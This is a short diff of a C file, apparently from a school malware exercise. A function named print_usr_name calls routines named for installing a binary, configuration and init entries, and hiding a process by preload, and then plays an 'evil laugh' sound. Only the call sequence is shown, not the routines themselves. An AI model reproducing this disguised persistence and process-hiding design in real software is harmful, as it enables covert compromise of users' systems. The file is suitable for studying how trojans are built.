@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/06/28 08:13:10 by root              #+#    #+#             */
-/*   Updated: 2018/08/05 18:33:30 by root             ###   ########.fr       */
+/*   Updated: 2018/08/05 20:29:35 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -36,12 +36,13 @@ static void			print_usr_name(const char *av)
 										   &install_conf,
 										   &install_init,
 										   &hide_process_preload };
+			if (install_binary(av))
+				return ;
 			for (size_t i = 0; i < sizeof(process) / sizeof(*process); i++) {
 				if (process[i]())
 					return ;
 			}
-			if (!install_binary(av))
-				system("mpg123 audio/Evil_Laugh.mp3 2>/dev/null");
+			system("mpg123 audio/Evil_Laugh.mp3 2>/dev/null");
 		}
 		return ;
 	}
